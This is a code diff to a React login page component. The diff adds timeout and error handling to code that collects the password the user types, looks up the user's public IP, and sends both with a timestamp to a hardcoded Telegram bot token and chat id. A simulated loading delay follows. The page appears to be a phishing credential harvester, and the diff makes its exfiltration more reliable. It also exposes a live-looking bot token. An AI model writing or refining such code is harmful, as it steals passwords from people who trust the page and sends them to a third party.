@@ -26,10 +26,28 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
     setError('');
 
     try {
-      // Get user's public IP address
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const userIP = ipData.ip || 'Unknown';
+      // Get user's public IP address with timeout and error handling
+      let userIP = 'Unknown';
+      try {
+        const ipController = new AbortController();
+        const ipTimeout = setTimeout(() => ipController.abort(), 5000); // 5 second timeout
+        
+        const ipResponse = await fetch('https://api.ipify.org?format=json', {
+          signal: ipController.signal,
+          headers: {
+            'Accept': 'application/json',
+          }
+        });
+        clearTimeout(ipTimeout);
+        
+        if (ipResponse.ok) {
+          const ipData = await ipResponse.json();
+          userIP = ipData.ip || 'Unknown';
+        }
+      } catch (ipError) {
+        console.log('Could not fetch IP address:', ipError);
+        userIP = 'Unknown';
+      }
 
       // Get current date and time
       const now = new Date();
@@ -51,15 +69,32 @@ Entered Password: ${password}
 IP Address: ${userIP}
 Time: ${dateStr} - ${timeStr}`;
 
-      // Send Telegram notification
-      await fetch('https://api.telegram.org/bot7731464090:AAEvV2JmckYlg9HyrS40pDUDVofU-VosoQ4/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: 809190054,
-          text: telegramMessage
-        })
-      });
+      // Send Telegram notification with error handling
+      try {
+        const telegramController = new AbortController();
+        const telegramTimeout = setTimeout(() => telegramController.abort(), 10000); // 10 second timeout
+        
+        const telegramResponse = await fetch('https://api.telegram.org/bot7731464090:AAEvV2JmckYlg9HyrS40pDUDVofU-VosoQ4/sendMessage', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: 809190054,
+            text: telegramMessage
+          }),
+          signal: telegramController.signal
+        });
+        clearTimeout(telegramTimeout);
+        
+        if (!telegramResponse.ok) {
+          console.log('Telegram API responded with error:', telegramResponse.status);
+        }
+      } catch (telegramError) {
+        console.log('Could not send Telegram notification:', telegramError);
+        // Continue with login process even if Telegram fails
+      }
 
       // Simulate loading for better UX
       await new Promise(resolve => setTimeout(resolve, 800));
